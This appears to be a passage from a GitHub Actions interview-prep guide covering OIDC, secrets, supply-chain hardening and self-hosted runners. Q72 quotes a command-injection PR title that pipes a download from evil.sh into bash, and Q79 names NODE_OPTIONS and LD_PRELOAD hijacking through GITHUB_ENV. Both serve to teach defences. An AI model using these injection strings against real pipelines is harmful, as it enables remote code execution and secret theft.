   ```bash
   gh api -X PUT orgs/devopsshack/actions/oidc/customization/sub \
     --input - <<< '{"include_claim_keys":["repo","context","job_workflow_ref"]}'
   ```
2. Trust policy `StringLike` on `sub` to `repo:devopsshack/*:environment:prod:job_workflow_ref:devopsshack/platform-workflows/.github/workflows/deploy-eks.yml@refs/tags/v*`.
3. Keep the platform-workflows repo protected (CODEOWNERS, tag rulesets).

**Why →** App teams can call the deploy workflow but cannot write their own job that assumes the prod role.

**Interview tip →** This is an advanced answer; few candidates know `job_workflow_ref`.

</details>

### Q42. You need an action that comments a Terraform plan summary on PRs and must work on Linux and Windows. Which kind? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** API calls, text processing, cross-platform.

**What I'd do →**
1. JavaScript action (`runs.using: node24`) using `@actions/github` to find and update an existing bot comment (avoid spam).
2. Bundle with ncc, commit `dist/`, test with Jest and an integration workflow on both OSes.

**Why →** Docker actions do not run on Windows; composite with bash scripting gets fragile for API pagination and JSON.

**Interview tip →** "Update the existing comment instead of posting a new one each run" shows UX awareness.

</details>

### Q43. A reusable workflow needs to return the deployed URL to the caller. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Output mapping through two levels.

**What I'd do →**
1. Step output, then job output, then workflow output:
   ```yaml
   on:
     workflow_call:
       outputs:
         url:
           value: ${{ jobs.deploy.outputs.url }}
   jobs:
     deploy:
       outputs:
         url: ${{ steps.svc.outputs.url }}
   ```
2. Caller reads `needs.<calling-job>.outputs.url`.

**Why →** Each boundary needs an explicit mapping.

**Interview tip →** Mention the `jobs` context exists only for this purpose.

</details>

### Q44. Teams ask for a "golden pipeline" but still need custom test steps. How do you design for extension? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Balance standardization and flexibility.

**What I'd do →**
1. Split the golden pipeline into stages as separate reusable workflows (build, scan, deploy) rather than one monolith.
2. Teams own their test job in their repo and chain: `test` (theirs) then `uses: platform/build-image.yml` then `uses: platform/deploy-eks.yml`.
3. Offer inputs for common knobs (Dockerfile path, build args, test command), not arbitrary script injection points.
4. Enforce non-negotiables (scan, provenance) inside the platform workflows and via rulesets.

**Why →** Composable blocks beat one template with 40 inputs.

**Interview tip →** "Paved road, not a cage."

</details>

### Q45. Your JavaScript action's `dist/` in a PR does not match the source. How do you prevent shipping stale bundles? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Source and committed bundle drift.

**What I'd do →**
1. CI job: `npm ci && npm run build && git diff --exit-code dist/`.
2. Optionally regenerate `dist/` in a release workflow instead of by hand.
3. Review `dist/` diffs in PRs from outside contributors carefully; that is where malicious code hides.

**Why →** The runner executes `dist/`, not `src/`.

**Interview tip →** Mention the supply-chain angle of reviewing bundled code.

</details>

### Q46. You maintain a public action used by thousands of repos. How do you release safely? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You are now part of others' supply chain.

**What I'd do →**
1. Protected `main`, required reviews, 2FA, tag rulesets restricting who can create `v*` tags.
2. Release via workflow from `main` only, with immutable releases enabled.
3. Semver tags plus moving major tag; document SHA pinning in the README.
4. Minimal dependencies, Dependabot, CodeQL, and provenance attestation for `dist/`.
5. A security policy and private vulnerability reporting.

**Why →** The tj-actions compromise showed how one maintainer token can hit thousands of pipelines.

**Interview tip →** Reference a real incident; it signals current awareness.

</details>

### Q47. You need a step that runs a Python linter with exact dependencies in many repos. Docker action or composite? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dependency isolation vs speed and portability.

**What I'd do →**
1. If Linux only, publish a prebuilt image to GHCR and a Docker action referencing `docker://ghcr.io/org/pylint-action@sha256:...`.
2. If cross-platform or speed matters, composite with `setup-python` (with cache) and a pinned requirements file shipped in the action repo.

**Why →** A prebuilt image gives exact dependencies; a `Dockerfile`-based action rebuilds every run, which is slow.

**Interview tip →** Call out "prebuilt image, not Dockerfile" for Docker actions.

</details>

### Q48. Consumers of your reusable workflow need different runners (hosted for most, ARC for one team). How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `runs-on` must be configurable.

**What I'd do →**
1. Input `runner` with default:
   ```yaml
   inputs:
     runner: { type: string, default: ubuntu-24.04 }
   jobs:
     build:
       runs-on: ${{ inputs.runner }}
   ```
2. For label arrays, accept a JSON string and use `fromJSON(inputs.runner)`.

**Why →** `runs-on` supports `inputs` context in reusable workflows.

**Interview tip →** Mention the JSON trick for multiple labels.

</details>

### Q49. A reusable workflow uses `concurrency: ${{ github.workflow }}` and two different callers cancel each other unexpectedly, or never serialize. Explain and fix. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** `github.workflow` resolves to the caller's name, so groups differ per caller (no serialization across callers) or collide if callers share names.

**What I'd do →**
1. Define the group from explicit inputs: `group: deploy-${{ inputs.environment }}-${{ inputs.service }}`.
2. Put it at job level in the reusable workflow with `cancel-in-progress: false`.

**Why →** Deterministic group keys based on what is being protected (environment and service) are the only safe choice.

**Interview tip →** "Concurrency keys should describe the resource, not the workflow."

</details>

### Q50. You want all repos to get a new security scan without editing 300 repos. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Org-wide enforcement.

**What I'd do →**
1. Put the scan workflow in a central repo.
2. Create an org ruleset with "Require workflows to pass before merging", targeting repos by custom property (`tier: production`).
3. Roll out in evaluate mode first, then active.

**Why →** Rulesets inject the workflow into PRs of targeted repos with no per-repo YAML.

**Interview tip →** Mention evaluate mode; big-bang enforcement creates angry teams.

</details>

### Q51. A composite action needs to run a script file that lives inside the action repo. How do you reference it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The working directory is the consumer's workspace, not the action's.

**What I'd do →**
1. Use `github.action_path`:
   ```yaml
   - run: ${{ github.action_path }}/scripts/check.sh
     shell: bash
   ```
2. Or add it to PATH: `echo "${{ github.action_path }}/scripts" >> "$GITHUB_PATH"`.

**Why →** Relative paths resolve against the consumer's repo and fail with "No such file".

**Interview tip →** `GITHUB_ACTION_PATH` is the env var equivalent.

</details>

### Q52. How would you migrate from Jenkins shared libraries to GitHub Actions reuse? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Map concepts, not code line by line.

**What I'd do →**
1. Inventory library functions and group them: whole-pipeline templates become reusable workflows, step helpers become composite actions, logic-heavy helpers (API calls, reporting) become JavaScript actions.
2. Replace credentials with OIDC and environments, `input` approvals with environment reviewers, agents with hosted or ARC runners.
3. Migrate a pilot service, run both systems in parallel for two weeks, compare durations and failures.
4. Use GitHub Actions Importer to bootstrap conversions, then clean up.

**Why →** A structured mapping avoids reproducing Jenkins anti-patterns in YAML.

**Interview tip →** Mention running both in parallel; it shows migration discipline.

</details>

---

## Secrets, OIDC & Environments

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q53. You find AWS access keys stored as repo secrets in 25 repos. Plan the migration. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Long-lived keys, unknown blast radius.

**What I'd do →**
1. Create the GitHub OIDC provider in each AWS account (Terraform).
2. Per repo and environment, create roles with trust pinned to `repo:ORG/REPO:environment:ENV` and least-privilege policies.
3. Replace `aws-access-key-id` inputs with `role-to-assume`, add `id-token: write`.
4. After a green deploy, deactivate then delete the IAM user keys; check CloudTrail for any remaining usage first.
5. Add an SCP or IAM policy alarm for new access keys on CI users.

**Why →** OIDC removes rotation burden and leaked-key risk; credentials live about an hour.

**Interview tip →** Mention checking CloudTrail before deleting keys; something always still uses them.

</details>

### Q54. A developer asks to print a secret in the log "just once" to debug. What do you do instead? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Debugging a credential problem without exposure.

**What I'd do →**
1. Check presence and shape without the value: `test -n "$TOKEN" && echo "len=${#TOKEN}"`, or compare a hash prefix: `echo -n "$TOKEN" | sha256sum | cut -c1-8`.
2. Test the credential against the API and print only the status code.
3. If the value is wrong, rotate it and re-set with `gh secret set`.

**Why →** Logs are readable by everyone with repo read access and are retained for 90 days.

**Interview tip →** "Verify shape and behaviour, never the value."

</details>

### Q55. Staging and prod need different database URLs and different AWS roles, using one workflow. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment-scoped config.

**What I'd do →**
1. Create environments `staging` and `prod`.
2. Same names in each: secret `DATABASE_URL`, variable `DEPLOY_ROLE_ARN`.
3. Job: `environment: ${{ inputs.environment }}` and reference `secrets.DATABASE_URL`, `vars.DEPLOY_ROLE_ARN`.

**Why →** Identical names keep the workflow generic; GitHub resolves values per environment.

**Interview tip →** Mention that prod secrets are only released after approval.

</details>

### Q56. Security requires two people for prod deploys: the author cannot approve. Configure it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separation of duties.

**What I'd do →**
1. Prod environment: required reviewers = team `release-approvers`, enable "Prevent self-review", disable admin bypass.
2. Deployment branches: `main` and tag pattern `v*` only.
3. Branch protection on `main` with required PR reviews so the code itself had a second reviewer.

**Why →** Prevent self-review blocks the person who triggered the run from approving it.

**Interview tip →** Mention audit trail: approvals are recorded on the deployment and in the audit log.

</details>

### Q57. Write the AWS trust policy for a role used only by the prod deploy job of one repo. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pin issuer, audience and subject.

**What I'd do →**
1. Trust policy:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Allow",
       "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
       "Action": "sts:AssumeRoleWithWebIdentity",
       "Condition": {
         "StringEquals": {
           "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
           "token.actions.githubusercontent.com:sub": "repo:devopsshack/shack-api:environment:prod"
         }
       }
     }]
   }
   ```
2. Attach a policy allowing only what the deploy needs (for example `eks:DescribeCluster`).

**Why →** Only jobs bound to the `prod` environment, which require approval, can assume it.

**Interview tip →** Explain that environment protection plus `sub` pinning chains GitHub approvals to AWS access.

</details>

### Q58. PR workflows need read-only AWS access for `terraform plan`, including from same-repo branches. How do you set trust? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate low-privilege role for PRs.

**What I'd do →**
1. Role `tf-plan-readonly` with `ReadOnlyAccess` plus state bucket read and lock table access.
2. Trust `sub` = `repo:devopsshack/infra:pull_request`.
3. Fork PRs do not get the OIDC token with secrets context in a usable way; keep plans for forks disabled or manual.

**Why →** PR code is less trusted, so its identity gets read-only permissions, while apply uses a different environment-pinned role.

**Interview tip →** Two roles, two trust subjects: one for PRs, one for the gated apply.

</details>

### Q59. A team stores a 200 KB kubeconfig and certificates as secrets and hits the size limit. What do you recommend? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** 48 KB secret limit, and static cluster credentials are a smell.

**What I'd do →**
1. For EKS: OIDC to AWS and `aws eks update-kubeconfig`; for AKS and GKE: the equivalent OIDC login and get-credentials.
2. For unavoidable files, store them in a secret manager and fetch at runtime, or encrypt the file in repo with `gpg --symmetric` and keep only the passphrase as a secret.

**Why →** Dynamic credentials remove both the size problem and the rotation problem.

**Interview tip →** Mention the 48 KB limit and the encrypted-file workaround from GitHub docs.

</details>

### Q60. You need Vault secrets in workflows without a static Vault token. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Vault supports JWT/OIDC auth with GitHub's issuer.

**What I'd do →**
1. Vault: `vault auth enable jwt`, configure `oidc_discovery_url=https://token.actions.githubusercontent.com`, `bound_issuer` the same.
2. Role with `bound_claims` on `repository` and `environment`, `user_claim=actor`, short TTL, and a policy for `secret/data/shack-api/prod/*`.
3. Workflow:
   ```yaml
   - uses: hashicorp/vault-action@v3
     with:
       url: https://vault.example.com
       method: jwt
       role: shack-api-prod
       secrets: secret/data/shack-api/prod db_password | DB_PASSWORD
   ```

**Why →** Same keyless model as cloud OIDC; Vault becomes the single source of truth.

**Interview tip →** Mention binding claims to environment so only approved jobs get prod secrets.

</details>

### Q61. Dependabot PRs fail because secrets are empty. Why, and what do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dependabot-triggered runs use Dependabot secrets, not Actions secrets, and get a read-only token.

**What I'd do →**
1. Add needed secrets under Settings, Secrets, Dependabot (for example a private registry token).
2. Skip steps that need write or deploy access when `github.actor == 'dependabot[bot]'`.
3. For auto-merge, use a separate `pull_request_target` workflow that only calls the API (no code checkout) with `dependabot/fetch-metadata`.

**Why →** Dependabot PR code is treated as untrusted, like fork code.

**Interview tip →** Know that Dependabot has its own secret store.

</details>

### Q62. A prod deploy waits for approval, but on-call is asleep and the fix is urgent. Design break-glass. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need speed without silently bypassing controls.

**What I'd do →**
1. Separate environment `prod-emergency` with a small senior approver group and its own AWS role, deploy branches `hotfix/*` and `main`.
2. `workflow_dispatch` with `reason` input written to the summary and posted to an incident channel.
3. Alert security on every use (audit log streaming rule).
4. Post-incident review of every emergency deploy.

**Why →** A documented, audited fast path beats admins bypassing protection rules.

**Interview tip →** Emphasize auditability over speed alone.

</details>

### Q63. You want approvals only for prod but automatic deploys to dev and staging, with staging delayed 10 minutes for smoke checks. Configure. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment rules per stage.

**What I'd do →**
1. `dev`: no rules, deployment branch `main`.
2. `staging`: wait timer 10 minutes, deployment branch `main`.
3. `prod`: required reviewers, prevent self-review, branches `main` and tags `v*`.
4. Chain with `needs: deploy-dev` then `needs: deploy-staging`.

**Why →** Rules live in environments, so the workflow stays simple.

**Interview tip →** Wait timers do not consume runner minutes.

</details>

### Q64. An org secret must be available only to three repos. How? And how do you audit who used it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Scoped org secret.

**What I'd do →**
1. `gh secret set NEXUS_TOKEN --org devopsshack --visibility selected --repos svc-a,svc-b,svc-c`.
2. Audit: org audit log events for secret changes; for usage, the credential's own server logs (Nexus access log) since GitHub does not log secret reads per run.

**Why →** Least distribution; usage auditing must happen at the target system.

**Interview tip →** Admit the limitation: GitHub records secret management, not per-run usage.

</details>

### Q65. You need to push to GHCR and to a second repo's branch from one workflow. Which tokens? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One same-repo action, one cross-repo action.

**What I'd do →**
1. GHCR push: `GITHUB_TOKEN` with `packages: write` (package linked to the repo).
2. Cross-repo push: GitHub App token from `actions/create-github-app-token` scoped to the target repo with `contents: write`.
3. Pass the app token only to the step that pushes.

**Why →** `GITHUB_TOKEN` cannot write to other repos; App tokens are short-lived and scoped.

**Interview tip →** Avoid PATs tied to a human account.

</details>

### Q66. You want to run deployment jobs from GitHub but the clusters are private with no public API endpoint. Options? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Hosted runners cannot reach private endpoints.

**What I'd do →**
1. ARC runners inside the VPC (or a dedicated small EKS cluster with network access), restricted via runner group to the deploy repos and workflows.
2. Or hosted larger runners with Azure private networking (Azure) or static IPs allow-listed on a bastion or proxy.
3. Or switch to GitOps: Actions updates a manifest repo, Argo CD inside the cluster pulls.

**Why →** GitOps removes inbound access entirely; ARC in-VPC keeps push-based deploys.

**Interview tip →** Present GitOps as the cleanest answer for private clusters.

</details>

### Q67. Secrets were exposed in public workflow logs for 3 hours. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Incident response, assume compromise.

**What I'd do →**
1. Rotate every exposed credential immediately; revoke tokens at the provider.
2. Delete the affected run logs (`gh run delete` or API) to stop further exposure.
3. Search provider audit logs (CloudTrail, npm) for use during the window.
4. Find the cause: `set -x`, transformed secret, third-party action, and fix it.
5. Postmortem, add log scanning, and move to OIDC where possible.

**Why →** Deleting logs does not undo exposure; rotation is the only real fix.

**Interview tip →** Rotate first, investigate second.

</details>

### Q68. Each environment should deploy to a different AWS account. How do you structure roles and variables? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Multi-account with OIDC.

**What I'd do →**
1. OIDC provider in each account (dev, staging, prod), created by Terraform.
2. Role per account trusting `repo:ORG/REPO:environment:<env>`.
3. Environment variable `DEPLOY_ROLE_ARN` per environment, `AWS_REGION` as repo variable.
4. Same workflow, `role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}`.

**Why →** Account boundaries plus environment-pinned trust contain any compromise to one stage.

**Interview tip →** Mention that role ARNs are config (variables), not secrets.

</details>

### Q69. You need a job to read prod secrets for a read-only smoke test without creating deployment noise or approvals. Approach? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment use implies deployments and protection rules.

**What I'd do →**
1. Create a separate environment `prod-smoke` with only the read-only secret and its own narrow role.
2. Restrict its deployment branches to `main`.
3. No reviewers, because the credential is read-only by design.

**Why →** Splitting by privilege keeps approvals meaningful where writes happen.

**Interview tip →** "Approvals guard write paths; read paths get narrow credentials instead."

</details>

### Q70. An auditor asks you to prove that no one deployed to prod without approval last quarter. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Evidence from GitHub and the cloud.

**What I'd do →**
1. Export deployments for the prod environment via API (`/repos/{o}/{r}/deployments?environment=prod`) and their reviews (`/actions/runs/{id}/approvals`).
2. Export audit log events for environment rule changes and bypasses.
3. Correlate with CloudTrail `AssumeRoleWithWebIdentity` events for the prod role (session name contains run ID) to show every prod session matches an approved run.

**Why →** Two independent sources make the evidence credible.

**Interview tip →** Mention setting `role-session-name` with the run ID to make this correlation possible.

</details>

---

## Security Hardening & Supply Chain

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q71. You are asked to harden an existing repo's workflows in one week. What is your checklist? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Fast, high-impact controls first.

**What I'd do →**
1. Set default workflow permissions to read-only; add `permissions: contents: read` at the top of every workflow and per-job grants.
2. Pin all third-party actions to SHAs; add Dependabot for `github-actions`.
3. Run `zizmor` and `actionlint`; fix script injection and `pull_request_target` usage.
4. `persist-credentials: false` on checkout where pushing is not needed.
5. Move cloud keys to OIDC; environment protection on prod.
6. CODEOWNERS on `.github/`; restrict allowed actions at org level.
7. Fork PR approval required for outside contributors.

**Why →** These close the most exploited paths: token abuse, mutable dependencies, and injection.

**Interview tip →** Lead with "least-privilege token and SHA pinning", the two controls every reviewer expects.

</details>

### Q72. A contributor's PR title is `"; curl -s https://evil.sh | bash; echo "` and your labeler workflow uses the title in `run:`. What happens and how do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Script injection; if the workflow uses `pull_request_target`, it runs with secrets and a write token.

**What I'd do →**
1. Replace inline interpolation with env:
   ```yaml
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: |
       if [[ "$TITLE" == feat* ]]; then echo "feature"; fi
   ```
2. Audit all workflows for `${{ github.event.*` inside `run:` and `script:`.
3. Rotate any secrets the workflow had access to if it has run on such a PR.

**Why →** Expressions are pasted into script text before execution; env variables are expanded as data.

**Interview tip →** List the untrusted fields: titles, bodies, branch names, commit messages, labels.

</details>

### Q73. Your OSS project needs to run tests on fork PRs and post coverage comments. Design it safely. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Untrusted code must run without secrets; commenting needs write access.

**What I'd do →**
1. `ci.yml` on `pull_request`: run tests, write `coverage.json` and the PR number to an artifact. No secrets, read-only token.
2. `comment.yml` on `workflow_run` (CI completed): download the artifact with `run-id`, validate PR number is an integer and the JSON schema, render the comment, post with `pull-requests: write`.
3. Never execute anything from the artifact; never check out the PR head in `comment.yml`.

**Why →** Splits untrusted execution from privileged writing, with only data crossing the boundary.

**Interview tip →** Name it "the two-workflow pattern" and mention artifact validation.

</details>

### Q74. A popular action you use was compromised and its tags repointed. What do you do in the first hour? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Supply-chain incident; assume secrets in affected runs leaked.

**What I'd do →**
1. Find usage org-wide: code search `org:devopsshack "tj-actions/changed-files"` and list runs in the exposure window.
2. Block the action at org level (allowed actions policy) to stop new runs.
3. Rotate every secret available to affected workflows; check logs of public repos for dumped secrets and delete those runs.
4. Replace with a pinned safe SHA or an alternative.
5. Enforce SHA pinning org-wide afterwards.

**Why →** Blocking stops the bleed, rotation removes the impact, pinning prevents recurrence.

**Interview tip →** Speak in time order: contain, rotate, eradicate, prevent.

</details>

### Q75. You must prove that a container image in prod was built by your CI from a specific commit. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Build provenance and verification at deploy time.

**What I'd do →**
1. In the build job, `actions/attest-build-provenance` on the pushed digest (`id-token: write`, `attestations: write`).
2. Before deploy, `gh attestation verify oci://$IMAGE@$DIGEST --owner devopsshack --signer-workflow devopsshack/shack-api/.github/workflows/cd.yml`.
3. In-cluster, enforce with Kyverno `verifyImages` or Sigstore policy-controller requiring provenance from your workflow identity.

**Why →** Signed provenance ties the digest to repo, workflow, commit and run, and admission policy makes it mandatory.

**Interview tip →** Mention SLSA levels; this setup gives SLSA build level 2 to 3 characteristics on hosted runners.

</details>

### Q76. A developer wants to use a new Marketplace action with 40 stars for Slack notifications. How do you evaluate it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Third-party code would run with the job's token and secrets.

**What I'd do →**
1. Check: maintainer reputation, recent activity, open security issues, permissions it requests, network calls in code, dependencies.
2. Prefer a few lines of `curl` to the Slack webhook over a dependency for trivial tasks.
3. If adopted: pin SHA, isolate it in a job with `permissions: {}` and only the webhook secret.
4. Add it to the org allow-list after review.

**Why →** Each action is a dependency with full job access.

**Interview tip →** "If it's ten lines of curl, I write the ten lines."

</details>

### Q77. You find `pull_request_target` used to build and test PRs in a private repo. Is that acceptable? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private repos limit forks to people with read access, but insiders, compromised accounts and accidental malicious dependencies still exist.

**What I'd do →**
1. Switch to `pull_request`; in private repos, same-repo PRs already get secrets with `pull_request`.
2. If forks are used internally, enable "Send secrets to workflows from fork pull requests" only if truly needed, and with approval required.
3. Remove the head checkout from any remaining `pull_request_target` workflow.

**Why →** `pull_request_target` gives no benefit here and keeps a dangerous pattern alive.

**Interview tip →** The trigger is for metadata on public fork PRs, not for building code.

</details>

### Q78. How do you stop workflows from pushing directly to `main` while still letting a release bot update the changelog? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Branch protection vs automation.

**What I'd do →**
1. Ruleset on `main`: require PRs and status checks, block force pushes.
2. Release bot (GitHub App) opens a PR with the changelog (release-please model) rather than pushing.
3. If direct push is essential, add only the App to the ruleset bypass list, never `GITHUB_TOKEN` broadly.

**Why →** Rulesets support specific app bypass, keeping humans and normal workflows under protection.

**Interview tip →** Prefer "bot opens PR" over bypasses.

</details>

### Q79. A workflow writes untrusted data to `$GITHUB_ENV`. Why is that dangerous and how do you fix it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Newlines in the data let an attacker define arbitrary env vars for later steps, such as `NODE_OPTIONS=--require /tmp/x.js` or `LD_PRELOAD`.

**What I'd do →**
1. Avoid writing untrusted values to `$GITHUB_ENV`; pass them as step outputs and map into `env:` of the consuming step.
2. If unavoidable, use a random heredoc delimiter and validate content (reject newlines).

**Why →** `GITHUB_ENV` affects every later step including third-party actions.

**Interview tip →** Mention `NODE_OPTIONS` as the concrete exploitation path.

</details>

### Q80. You want every PR that edits `.github/workflows/` to get security review automatically. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ownership and automated checks.

**What I'd do →**
1. CODEOWNERS: `/.github/ @devopsshack/platform-security`, plus "require review from Code Owners".
2. A workflow running `zizmor` and `actionlint` on `paths: ['.github/**']` that uploads SARIF to code scanning.

**Why →** Human review plus automated linting catches both design and pattern mistakes.

**Interview tip →** Workflow files are code with production credentials; treat them as such.

</details>

### Q81. Runners on GitHub-hosted VMs can reach the internet freely. How do you detect or limit exfiltration? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Egress control on hosted runners is limited.

**What I'd do →**
1. Use an egress-monitoring agent such as StepSecurity Harden-Runner in audit mode to baseline endpoints, then block mode with an allow-list.
2. For sensitive workflows, use larger runners with private networking or self-hosted runners behind an egress proxy.
3. Keep secrets scoped to steps so exfiltration from other steps finds nothing.

**Why →** The tj-actions incident was detected by egress monitoring of unexpected endpoints.

**Interview tip →** Mention audit first, then block, to avoid breaking builds.

</details>

### Q82. Your release workflow restores caches built by PR workflows. What is the risk and fix? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cache poisoning: a privileged release consumes data created in a less trusted context.

**What I'd do →**
1. Release builds run clean: no `actions/cache` restore, `setup-node` without `cache`, Docker build with `--no-cache` or registry cache written only from `main`.
2. Ensure no `pull_request_target` workflow saves caches.

**Why →** Releases are where integrity matters most; speed matters least.

**Interview tip →** "Release builds are hermetic and cacheless."

</details>

### Q83. Management wants all actions to come only from GitHub, verified creators, and an internal list. How do you implement it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Org policy.

**What I'd do →**
1. Org Settings, Actions, Policies: "Allow devopsshack, and select non-devopsshack, actions and reusable workflows", tick "Allow actions created by GitHub" and "Allow Marketplace actions by verified creators", add patterns like `aquasecurity/trivy-action@*`.
2. Enable "Require actions to be pinned to a full-length commit SHA" where available.
3. Document the request process for adding new actions.

**Why →** Explicit allow-listing turns the supply chain into a reviewed inventory.

**Interview tip →** Mention a request process; otherwise teams copy action code into repos to bypass.

</details>

### Q84. A job needs to push a commit back to the PR branch (auto-format). Do it safely. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Write access to branches, fork limitations, loop risk.

**What I'd do →**
1. Only for same-repo PRs: `if: github.event.pull_request.head.repo.full_name == github.repository`.
2. `permissions: contents: write`, checkout `ref: ${{ github.head_ref }}`.
3. Commit as `github-actions[bot]` and push; the push by `GITHUB_TOKEN` will not retrigger CI (no loop), so run checks on the formatted code in the same job or require a new push.

**Why →** Fork branches cannot be written with `GITHUB_TOKEN`, and pushing back with a PAT would trigger loops.

**Interview tip →** Many teams prefer failing the check with a diff over pushing commits.

</details>

### Q85. You want to detect secrets accidentally committed in PRs within CI. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secret scanning at PR time.

**What I'd do →**
1. Enable GitHub secret scanning with push protection (blocks pushes containing known token formats).
2. Add `gitleaks` in CI for custom patterns:
   ```yaml
   - uses: actions/checkout@v4
     with: { fetch-depth: 0 }
   - run: docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:v8.21.2 detect --source /repo --log-opts "origin/main..HEAD"
   ```

**Why →** Push protection prevents the leak; CI scanning catches custom formats.

**Interview tip →** Remember that a committed secret must be rotated even if the commit is removed.

</details>

### Q86. A third-party action requires `contents: write` but you only want it to read. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Over-privileged dependency.

**What I'd do →**
1. Read its code to understand why; often a feature you do not use (auto-commit).
2. Run it in a separate job with `permissions: contents: read` and see if it works with its write feature disabled.
3. If it truly needs write for a read use case, replace it.

**Why →** Granting write to a third-party action lets it modify your code or releases.

**Interview tip →** "Permissions are per job, so isolate risky actions in their own job."

</details>

---

## Runners, ARC, Monorepos & Releases

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q87. You must build on runners that can reach an internal Artifactory. Design the runner setup. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private network access, needs isolation and scaling.

**What I'd do →**
1. ARC on an EKS cluster in the VPC, scale set `arc-internal` with `minRunners: 1`, `maxRunners: 30`.
2. Runner group `internal-network` limited to selected repos.
3. Custom runner image with corporate CA and tools baked in.
4. Ephemeral pods, no node IAM role access (IMDS hop limit 1), OIDC for cloud access.

**Why →** Ephemeral pods in a controlled network give access without persistent risk.

**Interview tip →** Mention runner groups as the access control layer.

</details>

### Q88. Persistent self-hosted runners keep failing because a previous job left files and Docker images. Fix the root cause. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** State leaking between jobs.

**What I'd do →**
1. Move to ephemeral runners (`--ephemeral` with autoscaling, or ARC).
2. In the meantime, a job-completed hook (`ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/opt/cleanup.sh`) that wipes the workspace, prunes Docker and removes temp credentials.

**Why →** Cleanup scripts are a patch; ephemeral runners remove the class of problem.

**Interview tip →** Know the runner job-started and job-completed hooks.

</details>

### Q89. Design ARC for a company with Linux build jobs, Docker image builds, and GPU tests. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Different workloads need different scale sets.

**What I'd do →**
1. One controller, three scale sets: `arc-linux` (default mode, small CPU), `arc-docker` (dind mode on a tainted node pool), `arc-gpu` (nodeSelector for GPU nodes, `minRunners: 0`).
2. Each in its own namespace with ResourceQuotas and requests and limits in the pod template.
3. Karpenter NodePools per class, spot for linux and docker, on-demand for GPU.
4. Runner groups restrict GPU to ML repos.
5. Pin chart versions, monitor listener metrics (`listenerMetrics`) with Prometheus.

**Why →** Separate scale sets isolate privilege (dind) and cost (GPU) and scale independently.

**Interview tip →** Mention that `runs-on` equals the scale set name.

</details>

### Q90. You need to upgrade ARC across 10 clusters with zero dropped jobs. Plan it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Controller and scale sets must match versions; CRDs change.

**What I'd do →**
1. Read release notes for CRD changes.
